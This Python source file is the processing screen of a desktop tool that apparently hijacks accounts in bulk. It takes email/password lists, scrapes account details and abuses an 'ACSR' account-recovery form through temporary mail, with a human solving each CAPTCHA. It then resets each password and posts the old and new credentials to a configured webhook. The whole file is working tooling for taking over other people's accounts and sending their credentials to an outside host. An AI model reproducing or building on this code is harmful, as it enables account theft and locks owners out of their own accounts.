import customtkinter as ctk
from tkinter import messagebox
from PIL import Image
import sys
import os
import threading
import json

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from gui.styles import COLORS, FONTS, BUTTON_STYLES, ENTRY_STYLES, FRAME_STYLES
from utils.password_generator import generate_shulker_password

from automation.core import scrape_account_info
from automation.acsr import submit_acsr_form
from automation.acsr_continue import continue_acsr_flow
from automation.reset_password import perform_password_reset
from automation.logger import send_webhook

class ProcessingScreen(ctk.CTkFrame):
    def __init__(self, parent, accounts, auto_password, user_id):
        super().__init__(parent, fg_color=COLORS["bg_dark"])
        self.parent = parent
        self.accounts = accounts
        self.auto_password = auto_password
        self.user_id = user_id

        self.current_account_index = 0
        self.successful_accounts = []
        self.failed_accounts = []

        self.captcha_event = threading.Event()
        self.captcha_solution = None

        # Load webhook URL from config
        self.webhook_url = self.load_webhook_url()

        self.create_widgets()

    def load_webhook_url(self):
        try:
            config_path = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                "config.json"
            )
            with open(config_path, 'r') as f:
                config = json.load(f)
                return config.get("webhook_url", "")
        except:
            return ""

    def create_widgets(self):

        top_frame = ctk.CTkFrame(self, fg_color=COLORS["bg_medium"], height=80)
        top_frame.pack(fill="x", padx=20, pady=(20, 10))
        top_frame.pack_propagate(False)

        self.progress_label = ctk.CTkLabel(
            top_frame,
            text="Processing: 0 / 0",
            font=FONTS["title"],
            text_color=COLORS["text_white"]
        )
        self.progress_label.pack(side="left", padx=20, pady=20)

        self.status_label = ctk.CTkLabel(
            top_frame,
            text="Initializing...",
            font=FONTS["body"],
            text_color=COLORS["text_gray"]
        )
        self.status_label.pack(side="right", padx=20, pady=20)


        content_frame = ctk.CTkFrame(self, fg_color="transparent")
        content_frame.pack(fill="both", expand=True, padx=20, pady=10)


        left_frame = ctk.CTkFrame(content_frame, **FRAME_STYLES)
        left_frame.pack(side="left", fill="both", expand=True, padx=(0, 10))

        log_title = ctk.CTkLabel(
            left_frame,
            text="Processing Logs",
            font=FONTS["heading"],
            text_color=COLORS["text_white"]
        )
        log_title.pack(pady=(15, 10), padx=20)

        # Log display
        self.log_text = ctk.CTkTextbox(
            left_frame,
            fg_color=COLORS["bg_dark"],
            text_color=COLORS["text_white"],
            font=FONTS["body"],
            wrap="word"
        )
        self.log_text.pack(pady=(0, 15), padx=20, fill="both", expand=True)

        # Right side - CAPTCHA
        right_frame = ctk.CTkFrame(content_frame, **FRAME_STYLES, width=400)
        right_frame.pack(side="right", fill="y", padx=(10, 0))
        right_frame.pack_propagate(False)

        captcha_title = ctk.CTkLabel(
            right_frame,
            text="CAPTCHA",
            font=FONTS["heading"],
            text_color=COLORS["text_white"]
        )
        captcha_title.pack(pady=(15, 10), padx=20)


        self.captcha_frame = ctk.CTkFrame(
            right_frame,
            fg_color=COLORS["bg_dark"],
            width=350,
            height=200
        )
        self.captcha_frame.pack(pady=10, padx=20)
        self.captcha_frame.pack_propagate(False)

        self.captcha_label = ctk.CTkLabel(
            self.captcha_frame,
            text="CAPTCHA will appear here",
            font=FONTS["body"],
            text_color=COLORS["text_gray"]
        )
        self.captcha_label.pack(expand=True)


        input_label = ctk.CTkLabel(
            right_frame,
            text="Enter CAPTCHA:",
            font=FONTS["body_bold"],
            text_color=COLORS["text_white"]
        )
        input_label.pack(pady=(10, 5), padx=20)

        self.captcha_entry = ctk.CTkEntry(
            right_frame,
            **ENTRY_STYLES,
            width=300,
            placeholder_text="Type characters here",
            state="disabled"
        )
        self.captcha_entry.pack(pady=(0, 10), padx=20)

        self.submit_captcha_btn = ctk.CTkButton(
            right_frame,
            text="Submit CAPTCHA",
            command=self.submit_captcha,
            **BUTTON_STYLES["success"],
            width=300,
            state="disabled"
        )
        self.submit_captcha_btn.pack(pady=(0, 20), padx=20)


        bottom_frame = ctk.CTkFrame(self, fg_color=COLORS["bg_medium"], height=60)
        bottom_frame.pack(fill="x", padx=20, pady=(10, 20))
        bottom_frame.pack_propagate(False)

        self.summary_label = ctk.CTkLabel(
            bottom_frame,
            text="Success: 0  |  Failed: 0",
            font=FONTS["heading"],
            text_color=COLORS["text_white"]
        )
        self.summary_label.pack(pady=15)

    def log(self, message, color=None):
        self.log_text.configure(state="normal")
        if color:
            self.log_text.insert("end", f"{message}\n")
        else:
            self.log_text.insert("end", f"{message}\n")
        self.log_text.see("end")
        self.log_text.configure(state="disabled")
        self.parent.update()

    def update_progress(self):
        total = len(self.accounts)
        current = self.current_account_index + 1
        self.progress_label.configure(text=f"Processing: {current} / {total}")
        self.summary_label.configure(text=f"Success: {len(self.successful_accounts)}  |  Failed: {len(self.failed_accounts)}")

    def show_captcha(self, captcha_image_path):
        try:

            img = Image.open(captcha_image_path)
            img = img.resize((350, 180), Image.Resampling.LANCZOS)

            photo = ctk.CTkImage(light_image=img, dark_image=img, size=(350, 180))

            self.captcha_label.configure(image=photo, text="")
            self.captcha_label.image = photo  # Keep reference

            self.captcha_entry.configure(state="normal")
            self.captcha_entry.delete(0, "end")
            self.captcha_entry.focus()
            self.submit_captcha_btn.configure(state="normal")

            # Bind Enter key
            self.captcha_entry.bind('<Return>', lambda e: self.submit_captcha())

        except Exception as e:
            self.log(f"Error displaying CAPTCHA: {e}", "red")

    def submit_captcha(self):
        solution = self.captcha_entry.get().strip()

        if not solution:
            messagebox.showerror("Error", "Please enter the CAPTCHA")
            return

        self.captcha_solution = solution
        self.captcha_entry.configure(state="disabled")
        self.submit_captcha_btn.configure(state="disabled")

        self.captcha_event.set()

    def wait_for_captcha(self):
        self.captcha_event.clear()
        self.captcha_event.wait()
        return self.captcha_solution

    def start_processing(self):
        self.log("Starting password change process...")
        self.log(f"Total accounts: {len(self.accounts)}")
        self.log(f"Auto password: {'Yes' if self.auto_password else 'No'}")
        self.log("=" * 50)

        # Start processing in background thread
        thread = threading.Thread(target=self.process_accounts, daemon=True)
        thread.start()

    def process_accounts(self):
        for idx, account in enumerate(self.accounts):
            self.current_account_index = idx
            self.update_progress()

            email = account['email']
            old_password = account['password']

            self.log(f"\nProcessing account {idx + 1}/{len(self.accounts)}")
            self.log(f"Email: {email}")
            self.status_label.configure(text=f"Processing: {email}")

            try:

                if self.auto_password:
                    new_password = generate_shulker_password()
                    self.log(f"🔑 Generated password: {new_password}")
                else:
                    new_password = self.ask_new_password(email)
                    if not new_password:
                        self.log("Skipped: No password provided")
                        self.failed_accounts.append({"email": email, "error": "No password provided"})
                        continue


                self.log("Scraping account information...")
                account_info = scrape_account_info(email, old_password)

                if account_info.get("error"):
                    self.log(f"Failed to scrape: {account_info['error']}")
                    self.failed_accounts.append({"email": email, "error": account_info['error']})
                    continue

                self.log("Account information scraped successfully")


                self.log("Submitting ACSR form...")
                captcha_img, driver, token, tempmail = submit_acsr_form(account_info)

                if not captcha_img:
                    self.log("Failed at ACSR step")
                    self.failed_accounts.append({"email": email, "error": "ACSR submission failed"})
                    continue


                captcha_path = f"captcha_{self.user_id}_{idx}.png"
                with open(captcha_path, "wb") as f:
                    f.write(captcha_img.read())

                self.log("CAPTCHA received - please solve it")


                self.parent.after(0, lambda: self.show_captcha(captcha_path))
                captcha_solution = self.wait_for_captcha()

                self.log(f"CAPTCHA entered: {captcha_solution}")


                self.log("Continuing ACSR flow...")
                reset_link = continue_acsr_flow(driver, account_info, token, captcha_solution, self.user_id)


                retry_count = 0
                while reset_link == "CAPTCHA_RETRY_NEEDED" and retry_count < 3:
                    retry_count += 1
                    self.log(f"Wrong CAPTCHA - retry {retry_count}/3")

                    retry_captcha_path = f"captcha_retry_{self.user_id}.png"
                    self.parent.after(0, lambda p=retry_captcha_path: self.show_captcha(p))
                    captcha_solution = self.wait_for_captcha()

                    reset_link = continue_acsr_flow(driver, account_info, token, captcha_solution, self.user_id)

                if not reset_link or reset_link in ["CAPTCHA_RETRY_NEEDED", "OTP not received."]:
                    self.log(f"Failed to get reset link: {reset_link}")
                    self.failed_accounts.append({"email": email, "error": str(reset_link)})
                    continue

                self.log("Reset link obtained")


                self.log("Resetting password...")
                updated_password = perform_password_reset(reset_link, email, new_password)

                account_info['old_password'] = old_password
                account_info['new_password'] = updated_password

                self.log(f"Password changed successfully to: {updated_password}")
                self.successful_accounts.append(account_info)

            except Exception as e:
                self.log(f"Error processing account: {str(e)}")
                self.failed_accounts.append({"email": email, "error": str(e)})


        self.parent.after(0, self.finish_processing)

    def ask_new_password(self, email):
        # This needs to run on main thread
        result = [None]

        def show_dialog():
            dialog = ctk.CTkToplevel(self.parent)
            dialog.title("Enter New Password")
            dialog.geometry("400x200")
            dialog.configure(fg_color=COLORS["bg_dark"])
            dialog.transient(self.parent)
            dialog.grab_set()

            label = ctk.CTkLabel(
                dialog,
                text=f"Enter new password for:\n{email}",
                font=FONTS["body"],
                text_color=COLORS["text_white"]
            )
            label.pack(pady=(20, 10))

            entry = ctk.CTkEntry(dialog, **ENTRY_STYLES, width=300)
            entry.pack(pady=10)
            entry.focus()

            def submit():
                result[0] = entry.get().strip()
                dialog.destroy()

            btn = ctk.CTkButton(
                dialog,
                text="Submit",
                command=submit,
                **BUTTON_STYLES["success"]
            )
            btn.pack(pady=10)

            entry.bind('<Return>', lambda e: submit())
            dialog.wait_window()

        self.parent.after(0, show_dialog)

        import time
        while result[0] is None:
            time.sleep(0.1)

        return result[0]

    def finish_processing(self):
        self.log("\n" + "=" * 50)
        self.log("Processing complete")
        self.log(f"Successful: {len(self.successful_accounts)}")
        self.log(f"Failed: {len(self.failed_accounts)}")

        self.status_label.configure(text="Processing complete!")
        self.update_progress()

        if self.successful_accounts and self.webhook_url:
            self.log("\nSending results to webhook...")
            try:
                send_webhook(self.successful_accounts, self.webhook_url)
                self.log("Webhook sent successfully")
            except Exception as e:
                self.log(f"Webhook failed: {e}")

        messagebox.showinfo(
            "Complete",
            f"Processing complete!\n\nSuccessful: {len(self.successful_accounts)}\nFailed: {len(self.failed_accounts)}"
        )

        self.back_button = ctk.CTkButton(
            self,
            text="Back to Main Screen",
            command=self.go_back_to_main,
            fg_color=COLORS["accent_purple"],
            hover_color=COLORS["accent_blue"],
            text_color=COLORS["text_white"],
            corner_radius=10,
            width=300,
            height=50,
            font=("Arial", 16, "bold")
        )
        self.back_button.pack(pady=20)


        messagebox.showinfo(
            "Complete",
            f"Processing complete!\n\nSuccessful: {len(self.successful_accounts)}\nFailed: {len(self.failed_accounts)}"
        )


    def go_back_to_main(self):
        self.pack_forget()
        self.parent.show_main_window()
